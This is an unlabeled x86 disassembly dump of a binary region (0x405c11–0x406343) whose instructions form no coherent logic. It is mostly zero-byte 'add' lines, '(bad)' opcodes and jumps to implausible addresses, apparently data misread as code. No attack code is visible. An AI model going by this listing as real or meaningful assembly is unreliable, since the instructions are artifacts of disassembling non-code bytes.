  405c11:	add    BYTE PTR [ebx-0x80],dl
  405c14:	xor    eax,0x5300160d
  405c19:	and    BYTE PTR [edx],0xc
  405c1c:	push   ss
  405c1d:	add    BYTE PTR [ebx-0x80],dl
  405c20:	cli    
  405c21:	or     eax,0x80530016
  405c26:	cmp    BYTE PTR [esi+edx*1],cl
  405c29:	add    BYTE PTR [ebx-0x80],dl
  405c2c:	ror    BYTE PTR ds:0x80530016,0xa3
  405c33:	or     eax,0x80530016
  405c38:	jb     0x405c46
  405c3a:	push   ss
  405c3b:	add    BYTE PTR [ebx-0x80],dl
  405c3e:	bound  ecx,QWORD PTR [esi+edx*1]
  405c41:	add    BYTE PTR [ebx-0x80],dl
  405c44:	in     eax,0x14
  405c46:	push   ss
  405c47:	add    BYTE PTR [ebx-0x80],dl
  405c4a:	add    DWORD PTR ds:0x80530016,edx
  405c50:	pop    ds
  405c51:	adc    eax,0x80530016
  405c56:	cmp    eax,0x53001615
  405c5b:	add    al,0xc
  405c5e:	push   ss
  405c5f:	add    BYTE PTR [ebx-0x80],dl
  405c62:	(bad)  
  405c63:	or     al,0x16
  405c65:	add    BYTE PTR [ebx-0x80],dl
  405c68:	in     eax,dx
  405c69:	or     eax,0x80530016
  405c6e:	or     al,0xe
  405c70:	push   ss
  405c71:	add    BYTE PTR [ecx],dl
  405c73:	add    BYTE PTR [esi],dl
  405c75:	sbb    bh,bh
  405c77:	sub    eax,0x1a3e0001
  405c7c:	add    ebp,DWORD PTR [esi]
  405c7e:	shl    BYTE PTR [eax],1
  405c80:	add    BYTE PTR [eax],al
  405c82:	add    BYTE PTR [eax],al
  405c84:	xchg   BYTE PTR [eax],bl
  405c86:	mov    dh,0x3
  405c88:	sbb    al,0x0
  405c8a:	add    DWORD PTR [eax],eax
  405c8c:	out    0x20,al
  405c8e:	add    BYTE PTR [eax],al
  405c90:	add    BYTE PTR [eax],al
  405c92:	xchg   BYTE PTR [eax],bl
  405c94:	mov    dh,0x3
  405c96:	and    al,0x0
  405c98:	add    eax,0x20fd00
  405c9d:	add    BYTE PTR [eax],al
  405c9f:	add    BYTE PTR [esi+0x2d03b618],al
  405ca5:	add    BYTE PTR [edx],cl
  405ca7:	add    BYTE PTR [ecx+eiz*1],dl
  405caa:	add    BYTE PTR [eax],al
  405cac:	add    BYTE PTR [eax],al
  405cae:	add    DWORD PTR [eax],0x3603bc
  405cb4:	(bad)  
  405cb6:	jno    0x405cd9
  405cb8:	add    BYTE PTR [eax],al
  405cba:	add    BYTE PTR [eax],al
  405cbc:	xchg   BYTE PTR [eax],cl
  405cbe:	mov    DWORD PTR [ebx],0x160041
  405cc4:	jns    0x405ce7
  405cc6:	add    BYTE PTR [eax],al
  405cc8:	add    BYTE PTR [eax],al
  405cca:	xchg   BYTE PTR [eax],cl
  405ccc:	rol    BYTE PTR [ebx],1
  405cce:	inc    ecx
  405ccf:	add    BYTE PTR [esi],dl
  405cd1:	add    BYTE PTR [ecx+0x21],al
  405cd7:	add    BYTE PTR [esi+0x4103de08],al
  405cdd:	add    BYTE PTR [esi],dl
  405cdf:	add    BYTE PTR [ecx+0x21],cl
  405ce5:	add    BYTE PTR [esi+0x4503ee08],al
  405ceb:	add    BYTE PTR [esi],dl
  405ced:	add    BYTE PTR [ecx+0x21],dl
  405cf3:	add    BYTE PTR [esi+0x4503fd08],al
  405cf9:	add    BYTE PTR [esi],dl
  405cfb:	add    BYTE PTR [ecx+0x21],bl
  405d01:	add    BYTE PTR [esi+0x45040e08],al
  405d07:	add    BYTE PTR [esi],dl
  405d09:	add    BYTE PTR [ecx+0x21],ah
  405d0f:	add    BYTE PTR [esi+0x41042b08],al
  405d15:	add    BYTE PTR [esi],dl
  405d17:	add    BYTE PTR [ecx+0x21],ch
  405d1d:	add    BYTE PTR [esi+0x7403b618],al
  405d23:	add    BYTE PTR [esi],dl
  405d25:	add    ah,dl
  405d27:	and    DWORD PTR [eax],eax
  405d29:	add    BYTE PTR [eax],al
  405d2b:	add    dh,al
  405d2d:	or     DWORD PTR [ecx],ebx
  405d2f:	add    eax,0x190045
  405d34:	sbb    al,0x22
  405d36:	add    BYTE PTR [eax],al
  405d38:	add    BYTE PTR [eax],al
  405d3a:	xchg   BYTE PTR [eax],al
  405d3c:	es add eax,0x19007e
  405d42:	push   esp
  405d43:	and    al,BYTE PTR [eax]
  405d45:	add    BYTE PTR [eax],al
  405d47:	add    ah,al
  405d49:	add    DWORD PTR [esi],esp
  405d4b:	add    eax,0x1b0084
  405d50:	ins    BYTE PTR es:[edi],dx
  405d51:	and    al,BYTE PTR [eax]
  405d53:	add    BYTE PTR [eax],al
  405d55:	add    BYTE PTR [eax+eax*1+0x89052f],al
  405d5c:	sbb    al,0x0
  405d5e:	dec    eax
  405d5f:	and    eax,DWORD PTR [eax]
  405d61:	add    BYTE PTR [eax],al
  405d63:	add    BYTE PTR [ecx-0x70fac000],dl
  405d69:	add    BYTE PTR [esi],bl
  405d6b:	add    BYTE PTR [eax+0x23],cl
  405d71:	add    BYTE PTR [ecx-0x6afaa300],al
  405d77:	add    BYTE PTR [eax],ah
  405d79:	add    al,ah
  405d7b:	and    eax,DWORD PTR [eax]
  405d7d:	add    BYTE PTR [eax],al
  405d7f:	add    BYTE PTR [eax+ecx*1+0x99056f],al
  405d86:	and    BYTE PTR [eax],al
  405d88:	call   0x405db0
  405d8d:	add    BYTE PTR [eax+ecx*1+0x9e057c],al
  405d94:	and    BYTE PTR [eax],al
  405d96:	lock and eax,DWORD PTR [eax]
  405d99:	add    BYTE PTR [eax],al
  405d9b:	add    BYTE PTR [esi-0x5cfa6df8],al
  405da1:	add    BYTE PTR [eax],ah
  405da3:	add    ch,bh
  405da5:	and    eax,DWORD PTR [eax]
  405da7:	add    BYTE PTR [eax],al
  405da9:	add    BYTE PTR [esi+0x4503ee08],al
  405daf:	add    BYTE PTR [eax],ah
  405db1:	add    BYTE PTR [edx],cl
  405db3:	and    al,0x0
  405db5:	add    BYTE PTR [eax],al
  405db7:	add    BYTE PTR [esi+0x4103c708],al
  405dbd:	add    BYTE PTR [eax],ah
  405dbf:	add    BYTE PTR [edi],dl
  405dc1:	and    al,0x0
  405dc3:	add    BYTE PTR [eax],al
  405dc5:	add    BYTE PTR [esi+0x4103d008],al
  405dcb:	add    BYTE PTR [eax],ah
  405dcd:	add    BYTE PTR [esp],ah
  405dd0:	add    BYTE PTR [eax],al
  405dd2:	add    BYTE PTR [eax],al
  405dd4:	xchg   BYTE PTR [eax],cl
  405dd6:	std    
  405dd7:	add    eax,DWORD PTR [ebp+0x0]
  405dda:	and    BYTE PTR [eax],al
  405ddc:	xor    DWORD PTR [eax+eax*1],esp
  405ddf:	add    BYTE PTR [eax],al
  405de1:	add    BYTE PTR [ebx-0x57fa5cf8],al
  405de7:	add    BYTE PTR [eax],ah
  405de9:	add    BYTE PTR [ecx],bh
  405deb:	and    al,0x0
  405ded:	add    BYTE PTR [eax],al
  405def:	add    BYTE PTR [esi+0x41042b08],al
  405df5:	add    BYTE PTR [eax],ah
  405df7:	add    BYTE PTR [esi+0x24],al
  405dfa:	add    BYTE PTR [eax],al
  405dfc:	add    BYTE PTR [eax],al
  405dfe:	xchg   BYTE PTR [eax],cl
  405e00:	fiadd  WORD PTR [ebx]
  405e02:	inc    ecx
  405e03:	add    BYTE PTR [eax],ah
  405e05:	add    BYTE PTR [ebx+0x24],dl
  405e08:	add    BYTE PTR [eax],al
  405e0a:	add    BYTE PTR [eax],al
  405e0c:	xchg   esi,eax
  405e0d:	add    BYTE PTR [edi+0x2000b205],bh
  405e13:	add    BYTE PTR [ebp+0x24],bh
  405e16:	add    BYTE PTR [eax],al
  405e18:	add    BYTE PTR [eax],al
  405e1a:	xchg   BYTE PTR [eax],bl
  405e1c:	mov    dh,0x3
  405e1e:	je     0x405e20
  405e20:	and    eax,DWORD PTR [eax]
  405e22:	mov    BYTE PTR [eax+eax*1],ah
  405e25:	add    BYTE PTR [eax],al
  405e27:	add    ah,al
  405e29:	add    BYTE PTR [esi],ah
  405e2b:	add    eax,0x260084
  405e30:	mov    esp,0x24
  405e35:	add    dh,al
  405e37:	or     BYTE PTR [ecx],bl
  405e39:	add    eax,0x270045
  405e3e:	lock and al,0x0
  405e41:	add    BYTE PTR [eax],al
  405e43:	add    dh,al
  405e45:	add    DWORD PTR [ebx+0x6],ecx
  405e48:	std    
  405e49:	add    BYTE PTR [edi],ah
  405e4b:	add    BYTE PTR [eax+0x26],ah
  405e4e:	add    BYTE PTR [eax],al
  405e50:	add    BYTE PTR [eax],al
  405e52:	add    DWORD PTR [eax],0x1040651
  405e58:	sub    BYTE PTR [eax],al
  405e5a:	add    BYTE PTR [eax],al
  405e5c:	add    BYTE PTR [eax],al
  405e5e:	add    BYTE PTR [eax],al
  405e60:	les    eax,FWORD PTR ds:0x10a0668
  405e66:	sub    DWORD PTR [eax],eax
  405e68:	add    BYTE PTR [eax],al
  405e6a:	add    BYTE PTR [eax],al
  405e6c:	add    BYTE PTR [eax],al
  405e6e:	les    eax,FWORD PTR ds:0x10e0674
  405e74:	sub    DWORD PTR [eax],eax
  405e76:	lods   al,BYTE PTR ds:[esi]
  405e77:	add    BYTE PTR es:[eax],al
  405e7a:	add    BYTE PTR [eax],al
  405e7c:	add    DWORD PTR [eax],0x1140685
  405e82:	sub    DWORD PTR [eax],eax
  405e84:	inc    esp
  405e85:	daa    
  405e86:	add    BYTE PTR [eax],al
  405e88:	add    BYTE PTR [eax],al
  405e8a:	add    DWORD PTR [eax],0x10a03bc
  405e90:	sub    al,0x0
  405e92:	inc    edx
  405e93:	sub    BYTE PTR [eax],al
  405e95:	add    BYTE PTR [eax],al
  405e97:	add    BYTE PTR [esi+0x1d069708],al
  405e9d:	add    DWORD PTR [eax+eax*1],ebp
  405ea0:	pop    eax
  405ea1:	sub    BYTE PTR [eax],al
  405ea3:	add    BYTE PTR [eax],al
  405ea5:	add    BYTE PTR [esi+0x4506ae08],al
  405eab:	add    BYTE PTR [eax+eax*1],ch
  405eae:	pusha  
  405eaf:	sub    BYTE PTR [eax],al
  405eb1:	add    BYTE PTR [eax],al
  405eb3:	add    BYTE PTR [esi+0x2706b708],al
  405eb9:	add    DWORD PTR [eax+eax*1],ebp
  405ebc:	imul   ebp,DWORD PTR [eax],0x0
  405ec2:	xchg   BYTE PTR [eax],cl
  405ec4:	rol    BYTE PTR [esi],0x45
  405ec7:	add    BYTE PTR ds:0x287100,ch
  405ecd:	add    BYTE PTR [eax],al
  405ecf:	add    BYTE PTR [esi+0x2706cb08],al
  405ed5:	add    DWORD PTR ds:0x287c00,ebp
  405edb:	add    BYTE PTR [eax],al
  405edd:	add    BYTE PTR [esi+0xa06d600],al
  405ee3:	add    DWORD PTR [esi],ebp
  405ee5:	add    BYTE PTR [eax],al
  405ee7:	add    BYTE PTR [eax],al
  405ee9:	add    BYTE PTR [eax],al
  405eeb:	add    ah,al
  405eed:	add    eax,0x4106e0
  405ef2:	add    BYTE PTR cs:[eax+0x2a],ah
  405ef9:	add    BYTE PTR [ecx+0x2c070400],al
  405eff:	add    DWORD PTR [esi],ebp
  405f01:	add    BYTE PTR [ebx+ebp*1+0x0],bh
  405f08:	xchg   ecx,eax
  405f09:	add    BYTE PTR [edi+eax*1],cl
  405f0c:	cmp    eax,DWORD PTR [ecx]
  405f0e:	xor    BYTE PTR [eax],al
  405f10:	cmp    al,0x2c
  405f12:	add    BYTE PTR [eax],al
  405f14:	add    BYTE PTR [eax],al
  405f16:	xchg   ecx,eax
  405f17:	add    BYTE PTR [edx],ah
  405f19:	pop    es
  405f1a:	inc    esp
  405f1b:	add    DWORD PTR ds:0x2c7800,esi
  405f21:	add    BYTE PTR [eax],al
  405f23:	add    BYTE PTR [esi+0x4a073200],dl
  405f29:	add    DWORD PTR [edi],esi
  405f2b:	add    BYTE PTR [eax+0x2c],bl
  405f31:	add    BYTE PTR [esi+0x4a073d00],dl
  405f37:	add    DWORD PTR [edi],esi
  405f39:	add    BYTE PTR [esp+ebp*1+0x0],bh
  405f40:	xchg   ecx,eax
  405f41:	add    BYTE PTR [ebx+0x7],cl
  405f44:	dec    esi
  405f45:	add    DWORD PTR [edi],esi
  405f47:	add    al,ch
  405f49:	sub    al,0x0
  405f4b:	add    BYTE PTR [eax],al
  405f4d:	add    BYTE PTR [eax+ebx*1+0x10a03b6],al
  405f54:	aaa    
  405f55:	add    al,dh
  405f57:	sub    al,0x0
  405f59:	add    BYTE PTR [eax],al
  405f5b:	add    BYTE PTR [esi+0x6203b618],al
  405f61:	add    DWORD PTR [edi],esi
  405f63:	add    BYTE PTR [edx],dl
  405f65:	sub    eax,0x0
  405f6a:	xchg   BYTE PTR [eax],bl
  405f6c:	mov    dh,0x3
  405f6e:	imul   eax,DWORD PTR [ecx],0x2d25003a
  405f74:	add    BYTE PTR [eax],al
  405f76:	add    BYTE PTR [eax],al
  405f78:	xchg   BYTE PTR [eax],cl
  405f7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f7b:	pop    es
  405f7c:	jno    0x405f7f
  405f7e:	add    BYTE PTR ds:0x2d,ch
  405f85:	add    BYTE PTR [esi-0x6af84ef8],al
  405f8b:	add    BYTE PTR [esi],bh
  405f8d:	add    BYTE PTR [edi],bh
  405f8f:	sub    eax,0x0
  405f94:	xchg   BYTE PTR [eax],cl
  405f96:	fiadd  WORD PTR [ebx]
  405f98:	inc    ecx
  405f99:	add    BYTE PTR [esi],bh
  405f9b:	add    BYTE PTR [edi+0x2d],al
  405f9e:	add    BYTE PTR [eax],al
  405fa0:	add    BYTE PTR [eax],al
  405fa2:	xchg   BYTE PTR [eax],bl
  405fa4:	mov    dh,0x3
  405fa6:	test   DWORD PTR [ecx],eax
  405fa8:	add    BYTE PTR ds:[eax+0x2d],bh
  405fac:	add    BYTE PTR [eax],al
  405fae:	add    BYTE PTR [eax],al
  405fb0:	add    DWORD PTR [eax],0x18b07ee
  405fb6:	inc    eax
  405fb7:	add    BYTE PTR [ecx],cl
  405fb9:	add    BYTE PTR cs:[eax],al
  405fbc:	add    BYTE PTR [eax],al
  405fbe:	xchg   BYTE PTR [eax],cl
  405fc0:	cmc    
  405fc1:	pop    es
  405fc2:	inc    ebp
  405fc3:	add    BYTE PTR [ecx+0x0],al
  405fc6:	adc    DWORD PTR [esi],ebp
  405fc8:	add    BYTE PTR [eax],al
  405fca:	add    BYTE PTR [eax],al
  405fcc:	xchg   BYTE PTR [eax],cl
  405fce:	add    ecx,DWORD PTR [eax]
  405fd0:	inc    ecx
  405fd1:	add    BYTE PTR [ecx+0x0],al
  405fd4:	sbb    DWORD PTR [esi],ebp
  405fd6:	add    BYTE PTR [eax],al
  405fd8:	add    BYTE PTR [eax],al
  405fda:	xchg   BYTE PTR [eax],cl
  405fdc:	push   cs
  405fdd:	or     BYTE PTR [ecx+0x1],dh
  405fe0:	inc    ecx
  405fe1:	add    BYTE PTR [eax],ch
  405fe3:	add    BYTE PTR cs:[eax],al
  405fe6:	add    BYTE PTR [eax],al
  405fe8:	xchg   BYTE PTR [eax],cl
  405fea:	sbb    BYTE PTR [eax],cl
  405fec:	nop
  405fed:	add    DWORD PTR [ecx+0x0],eax
  405ff0:	push   0x2e
  405ff5:	add    BYTE PTR [ecx-0x6af7df00],al
  405ffb:	add    DWORD PTR [edx+0x0],eax
  405ffe:	jl     0x40602f
  406000:	add    BYTE PTR [eax],al
  406002:	add    BYTE PTR [eax],al
  406004:	xchg   BYTE PTR [eax],bl
  406006:	mov    dh,0x3
  406008:	lahf   
  406009:	add    DWORD PTR [ebx+0x0],eax
  40600c:	mov    WORD PTR [edi],gs
  40600e:	add    BYTE PTR [eax],al
  406010:	add    BYTE PTR [eax],al
  406012:	xchg   BYTE PTR [eax],cl
  406014:	data16 or BYTE PTR [ecx+0x1],dh
  406018:	inc    ebp
  406019:	add    BYTE PTR [edi+ebp*1+0x0],dl
  406020:	xchg   BYTE PTR [eax],cl
  406022:	jne    0x40602c
  406024:	jno    0x406027
  406026:	inc    ebp
  406027:	add    BYTE PTR [edi+ebp*1+0x0],bl
  40602e:	xchg   BYTE PTR [eax],cl
  406030:	or     BYTE PTR [eax],0x71
  406033:	add    DWORD PTR [ebp+0x0],eax
  406036:	lods   eax,DWORD PTR ds:[esi]
  406037:	das    
  406038:	add    BYTE PTR [eax],al
  40603a:	add    BYTE PTR [eax],al
  40603c:	xchg   BYTE PTR [eax],bl
  40603e:	mov    dh,0x3
  406040:	mov    ebx,0xc3004501
  406045:	das    
  406046:	add    BYTE PTR [eax],al
  406048:	add    BYTE PTR [eax],al
  40604a:	xchg   BYTE PTR [eax],cl
  40604c:	fiadd  WORD PTR [ebx]
  40604e:	inc    ecx
  40604f:	add    BYTE PTR [edi+0x0],al
  406052:	retf   
  406053:	das    
  406054:	add    BYTE PTR [eax],al
  406056:	add    BYTE PTR [eax],al
  406058:	xchg   BYTE PTR [eax],cl
  40605a:	ror    DWORD PTR [eax],cl
  40605c:	inc    ecx
  40605d:	add    BYTE PTR [edi+0x0],al
  406060:	call   0x406094
  406065:	add    BYTE PTR [esi-0x2afc49e8],al
  40606b:	add    DWORD PTR [edi+0x0],eax
  40606e:	push   esp
  40606f:	xor    BYTE PTR [eax],al
  406071:	add    BYTE PTR [eax],al
  406073:	add    dh,ah
  406075:	add    DWORD PTR [edx],esi
  406077:	or     esp,ebx
  406079:	add    DWORD PTR [edx+0x0],ecx
  40607c:	out    dx,al
  40607d:	xor    BYTE PTR [eax],al
  40607f:	add    BYTE PTR [eax],al
  406081:	add    dh,ah
  406083:	add    DWORD PTR [esi],esi
  406085:	or     DWORD PTR [edx],ecx
  406087:	add    DWORD PTR [ebx+0x0],ecx
  40608a:	sti    
  40608b:	xor    BYTE PTR [eax],al
  40608d:	add    BYTE PTR [eax],al
  40608f:	add    dh,ah
  406091:	add    DWORD PTR [ecx+ecx*1],edi
  406094:	loope  0x406097
  406096:	dec    ebx
  406097:	add    BYTE PTR [ecx],cl
  406099:	xor    DWORD PTR [eax],eax
  40609b:	add    BYTE PTR [eax],al
  40609d:	add    dh,ah
  40609f:	add    DWORD PTR [ebp+0x9],eax
  4060a2:	out    0x1,al
  4060a4:	dec    esp
  4060a5:	add    BYTE PTR [eax],bl
  4060a7:	xor    DWORD PTR [eax],eax
  4060a9:	add    BYTE PTR [eax],al
  4060ab:	add    dh,ah
  4060ad:	or     DWORD PTR [esi],ecx
  4060af:	or     BYTE PTR [ecx+0x1],dh
  4060b2:	dec    esi
  4060b3:	add    BYTE PTR ds:0x31,ah
  4060b9:	add    dh,ah
  4060bb:	or     DWORD PTR [ecx+ecx*1+0x45],ecx
  4060bf:	add    BYTE PTR [esi+0x0],cl
  4060c2:	xor    dh,BYTE PTR [ecx]
  4060c4:	add    BYTE PTR [eax],al
  4060c6:	add    BYTE PTR [eax],al
  4060c8:	out    0x1,al
  4060ca:	pop    ebx
  4060cb:	or     ecx,esp
  4060cd:	add    DWORD PTR [esi+0x0],ecx
  4060d0:	inc    eax
  4060d1:	xor    DWORD PTR [eax],eax
  4060d3:	add    BYTE PTR [eax],al
  4060d5:	add    dh,ah
  4060d7:	add    DWORD PTR [eax+0x9],esi
  4060da:	in     eax,dx
  4060db:	add    DWORD PTR [edi+0x0],ecx
  4060de:	push   edx
  4060df:	xor    DWORD PTR [eax],eax
  4060e1:	add    BYTE PTR [eax],al
  4060e3:	add    cl,ah
  4060e5:	add    DWORD PTR [edx+0x4f01f509],ecx
  4060eb:	add    BYTE PTR [ecx+esi*1+0x0],ah
  4060ef:	add    BYTE PTR [eax],al
  4060f1:	add    BYTE PTR [esi-0x6ff7e7f8],al
  4060f7:	add    DWORD PTR [edi+0x0],ecx
  4060fa:	(bad)  [edi]
  4060fc:	add    BYTE PTR [eax],al
  4060fe:	add    BYTE PTR [eax],al
  406100:	xchg   ecx,eax
  406101:	add    BYTE PTR [ecx+0x22],ah
  406104:	pop    ebx
  406105:	cs push eax
  406107:	add    BYTE PTR [ecx+esi*1+0x0],dh
  40610b:	add    BYTE PTR [eax],al
  40610d:	add    BYTE PTR [ecx+0x110a4300],dl
  406113:	add    dl,BYTE PTR [ecx+0x0]
  406116:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406117:	xor    al,BYTE PTR [eax]
  406119:	add    BYTE PTR [eax],al
  40611b:	add    BYTE PTR [ecx+0x170a4800],dl
  406121:	add    dl,BYTE PTR [edx+0x0]
  406124:	call   0x40615b
  406129:	add    BYTE PTR [ecx+0x1b0a6000],dl
  40612f:	add    dl,BYTE PTR [edx+0x0]
  406132:	xchg   esp,eax
  406133:	xor    eax,DWORD PTR [eax]
  406135:	add    BYTE PTR [eax],al
  406137:	add    BYTE PTR [ecx+0x200a8700],dl
  40613d:	add    dl,BYTE PTR [ebx+0x0]
  406140:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406141:	xor    eax,DWORD PTR [eax]
  406143:	add    BYTE PTR [eax],al
  406145:	add    BYTE PTR [ecx+0x250ab000],dl
  40614b:	add    dl,BYTE PTR [ebx+0x0]
  40614e:	mov    bh,0x33
  406150:	add    BYTE PTR [eax],al
  406152:	add    BYTE PTR [eax],al
  406154:	xchg   ecx,eax
  406155:	add    BYTE PTR ds:0x53022a0b,cl
  40615b:	add    al,cl
  40615d:	xor    eax,DWORD PTR [eax]
  40615f:	add    BYTE PTR [eax],al
  406161:	add    BYTE PTR [ecx+0x340b1a00],dl
  406167:	add    dl,BYTE PTR [eax+eax*1+0x68]
  40616b:	xor    al,0x0
  40616d:	add    BYTE PTR [eax],al
  40616f:	add    BYTE PTR [ecx+0x3e0b4700],dl
  406175:	add    dl,BYTE PTR [ebp+0x0]
  406178:	mov    BYTE PTR [eax+eax*1],dh
  40617b:	add    BYTE PTR [eax],al
  40617d:	add    BYTE PTR [ecx+0x170b6800],dl
  406183:	add    bl,BYTE PTR [eax+0x0]
  406186:	les    esi,FWORD PTR [eax+eax*1]
  406189:	add    BYTE PTR [eax],al
  40618b:	add    BYTE PTR [ecx+0x490b8100],dl
  406191:	add    bl,BYTE PTR [eax+0x0]
  406194:	or     BYTE PTR ds:0x0,dh
  40619a:	xchg   ecx,eax
  40619b:	add    BYTE PTR [ebp+0x59024f0b],bl
  4061a1:	add    BYTE PTR [ebp+esi*1+0x0],bl
  4061a5:	add    BYTE PTR [eax],al
  4061a7:	add    BYTE PTR [ecx+0x5b0b8100],dl
  4061ad:	add    bl,BYTE PTR [edi+0x0]
  4061b0:	sbb    al,0x36
  4061b2:	add    BYTE PTR [eax],al
  4061b4:	add    BYTE PTR [eax],al
  4061b6:	xchg   ecx,eax
  4061b7:	add    BYTE PTR [edx+0x6502660b],bh
  4061bd:	add    BYTE PTR [esi+0x36],bh
  4061c0:	add    BYTE PTR [eax],al
  4061c2:	add    BYTE PTR [eax],al
  4061c4:	xchg   BYTE PTR [eax],bl
  4061c6:	mov    dh,0x3
  4061c8:	or     al,BYTE PTR [ecx]
  4061ca:	data16 add BYTE PTR [edx+0x36],dh
  4061ce:	add    BYTE PTR [eax],al
  4061d0:	add    BYTE PTR [eax],al
  4061d2:	xchg   ecx,eax
  4061d3:	sbb    bh,cl
  4061d5:	and    eax,0x660217
  4061da:	xchg   BYTE PTR [esi],dh
  4061dc:	add    BYTE PTR [eax],al
  4061de:	add    BYTE PTR [eax],al
  4061e0:	xchg   BYTE PTR [eax],bl
  4061e2:	mov    dh,0x3
  4061e4:	or     al,BYTE PTR [ecx]
  4061e6:	data16 add BYTE PTR [esi+0x36],cl
  4061ed:	add    dh,al
  4061ef:	add    BYTE PTR [ebx+0x6],cl
  4061f2:	std    
  4061f3:	add    BYTE PTR [esi+0x0],ah
  4061f6:	mov    dl,0x36
  4061f8:	add    BYTE PTR [eax],al
  4061fa:	add    BYTE PTR [eax],al
  4061fc:	les    eax,FWORD PTR [eax]
  4061fe:	loopne 0x406206
  406200:	inc    ecx
  406201:	add    BYTE PTR [edi+0x0],ah
  406204:	shl    BYTE PTR [esi],0x0
  406207:	add    BYTE PTR [eax],al
  406209:	add    ah,al
  40620b:	add    BYTE PTR [esi+eax*1+0xe],dh
  40620f:	add    DWORD PTR [edi+0x0],esp
  406212:	and    BYTE PTR [edi],dh
  406214:	add    BYTE PTR [eax],al
  406216:	add    BYTE PTR [eax],al
  406218:	les    eax,FWORD PTR [eax]
  40621a:	push   0x67010a06
  40621f:	add    BYTE PTR [ebx],bh
  406221:	aaa    
  406222:	add    BYTE PTR [eax],al
  406224:	add    BYTE PTR [eax],al
  406226:	xchg   BYTE PTR [eax],cl
  406228:	and    BYTE PTR [edi],cl
  40622a:	jno    0x40622f
  40622c:	add    BYTE PTR [bp+di+0x37],al
  406230:	add    BYTE PTR [eax],al
  406232:	add    BYTE PTR [eax],al
  406234:	xchg   BYTE PTR [eax],cl
  406236:	sub    DWORD PTR [edi],ecx
  406238:	jbe    0x40623d
  40623a:	add    BYTE PTR [bp+di+0x37],cl
  40623e:	add    BYTE PTR [eax],al
  406240:	add    BYTE PTR [eax],al
  406242:	xchg   BYTE PTR [eax],cl
  406244:	xor    BYTE PTR [edi],cl
  406246:	inc    ecx
  406247:	add    BYTE PTR [edi+0x0],ah
  40624a:	push   ebx
  40624b:	aaa    
  40624c:	add    BYTE PTR [eax],al
  40624e:	add    BYTE PTR [eax],al
  406250:	xchg   BYTE PTR [eax],cl
  406252:	cmp    BYTE PTR [edi],cl
  406254:	fadd   QWORD PTR [ecx]
  406256:	add    BYTE PTR [si+0x37],dh
  40625a:	add    BYTE PTR [eax],al
  40625c:	add    BYTE PTR [eax],al
  40625e:	xchg   BYTE PTR [eax],cl
  406260:	inc    eax
  406261:	(bad)  
  406263:	add    ebp,DWORD PTR [eax+0x0]
  406266:	jl     0x40629f
  406268:	add    BYTE PTR [eax],al
  40626a:	add    BYTE PTR [eax],al
  40626c:	xchg   BYTE PTR [eax],cl
  40626e:	dec    ebp
  40626f:	jo     0x8540ca78
  406275:	aaa    
  406276:	add    BYTE PTR [eax],al
  406278:	add    BYTE PTR [eax],al
  40627a:	xchg   BYTE PTR [eax],cl
  40627c:	pop    edx
  40627d:	jbe    0x8d40cb86
  406283:	aaa    
  406284:	add    BYTE PTR [eax],al
  406286:	add    BYTE PTR [eax],al
  406288:	xchg   BYTE PTR [eax],cl
  40628a:	jnp    0xcb92
  40628f:	add    BYTE PTR [esi+0x37],dl
  406295:	add    BYTE PTR [esi+0x450f7208],al
  40629b:	add    BYTE PTR [edx+0x0],ch
  40629e:	sahf   
  40629f:	aaa    
  4062a0:	add    BYTE PTR [eax],al
  4062a2:	add    BYTE PTR [eax],al
  4062a4:	xchg   BYTE PTR [eax],cl
  4062a6:	mov    WORD PTR [edi],cs
  4062a8:	daa    
  4062a9:	add    DWORD PTR [edx+0x0],ebp
  4062ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062ad:	aaa    
  4062ae:	add    BYTE PTR [eax],al
  4062b0:	add    BYTE PTR [eax],al
  4062b2:	xchg   BYTE PTR [eax],cl
  4062b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062b5:	cmovno eax,DWORD PTR [eax]
  4062b8:	imul   eax,DWORD PTR [eax],0xffffffc8
  4062bb:	aaa    
  4062bc:	add    BYTE PTR [eax],al
  4062be:	add    BYTE PTR [eax],al
  4062c0:	xchg   BYTE PTR [eax],cl
  4062c2:	scas   al,BYTE PTR es:[edi]
  4062c3:	paddusb mm0,QWORD PTR [ecx]
  4062c6:	imul   eax,DWORD PTR [eax],0xfffffff0
  4062c9:	aaa    
  4062ca:	add    BYTE PTR [eax],al
  4062cc:	add    BYTE PTR [eax],al
  4062ce:	xchg   BYTE PTR [eax],al
  4062d0:	mov    dh,0xf
  4062d2:	or     al,BYTE PTR [ecx]
  4062d4:	ins    BYTE PTR es:[edi],dx
  4062d5:	add    BYTE PTR [eax+0x38],bh
  4062db:	add    BYTE PTR [ecx-0x6ef03200],al
  4062e1:	add    ebp,DWORD PTR [eax+eax*1+0x8]
  4062e5:	cmp    DWORD PTR [eax],eax
  4062e7:	add    BYTE PTR [eax],al
  4062e9:	add    BYTE PTR [ecx-0x63f01300],al
  4062ef:	add    ebp,DWORD PTR [edi+0x0]
  4062f2:	xor    BYTE PTR [ecx],bh
  4062f4:	add    BYTE PTR [eax],al
  4062f6:	add    BYTE PTR [eax],al
  4062f8:	add    DWORD PTR [eax],0x7e0ffb
  4062fe:	jno    0x406300
  406300:	ins    BYTE PTR es:[edi],dx
  406301:	cmp    DWORD PTR [eax],eax
  406303:	add    BYTE PTR [eax],al
  406305:	add    BYTE PTR [ecx+0x7e101300],al
  40630b:	add    BYTE PTR [ebx+0x0],dh
  40630e:	sahf   
  40630f:	cmp    DWORD PTR [eax],eax
  406311:	add    BYTE PTR [eax],al
  406313:	add    BYTE PTR [esi+0xa03b618],al
  406319:	add    DWORD PTR [ebp+0x0],esi
  40631c:	sar    BYTE PTR [ecx],1
  40631e:	add    BYTE PTR [eax],al
  406320:	add    BYTE PTR [eax],al
  406322:	xchg   ebx,eax
  406323:	add    BYTE PTR [eax+edx*1-0x4a],ah
  406327:	add    esi,DWORD PTR [ebp+0x0]
  40632a:	clc    
  40632b:	cmp    DWORD PTR [eax],eax
  40632d:	add    BYTE PTR [eax],al
  40632f:	add    BYTE PTR [ebx-0x43ef8c00],dl
  406335:	add    esi,DWORD PTR [edi+0x0]
  406338:	sbb    edi,DWORD PTR [edx]
  40633a:	add    BYTE PTR [eax],al
  40633c:	add    BYTE PTR [eax],al
  40633e:	xchg   ebx,eax
  40633f:	or     BYTE PTR [edi+0x10],bh
  406342:	dec    edx
  406343:	add    DWORD PTR [eax+0x0],edi
